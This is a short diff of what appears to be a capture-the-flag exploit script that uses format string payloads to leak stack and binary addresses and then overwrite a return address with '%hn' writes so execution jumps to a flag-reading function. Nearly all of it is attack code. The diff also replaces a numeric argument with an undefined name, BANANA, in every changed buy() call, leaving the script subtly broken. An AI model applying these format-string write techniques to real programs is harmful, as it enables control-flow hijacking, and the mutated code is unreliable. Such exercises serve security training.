@@ -67,7 +67,7 @@ print_menu()
 # 0x5555555554b0 - 0x555555554000 = 0x14B0
 # 0x7fffffffdd10 + 0x8 = 0x7fffffffdd18
 
-buy(2,'-1','A' * 64 + '%13$p.%9$p.%6$p')
+buy(BANANA,'-1','A' * 64 + '%13$p.%9$p.%6$p')
 change_label(1,'a' * 10)
 data = create_invoice()
 print data
@@ -98,12 +98,12 @@ log.info('ret_addr = ' + hex(ret_addr))
 # Gone be doing it in 2 steps:
 
 # 1: 0x7fffffffdd00 (current data: 0x7fffffffdd10) -> 0x7fffffffdd18
-buy(2,'-1', 'B' * 64 + '%'+str(ret_addr&0xffff)+'x%6$hn')
+buy(BANANA,'-1', 'B' * 64 + '%'+str(ret_addr&0xffff)+'x%6$hn')
 change_label(2,'b' * 10)
 create_invoice()
 
 # 2: 0x7fffffffdd10 (current data: 0x7fffffffdd18) -> 0x555555554c92
-buy(2,'-1','C' * 64 + '%'+str(read_flag_addr&0xffff)+'x%8$hn')
+buy(BANANA,'-1','C' * 64 + '%'+str(read_flag_addr&0xffff)+'x%8$hn')
 change_label(3,'c' * 10)
 
 '''
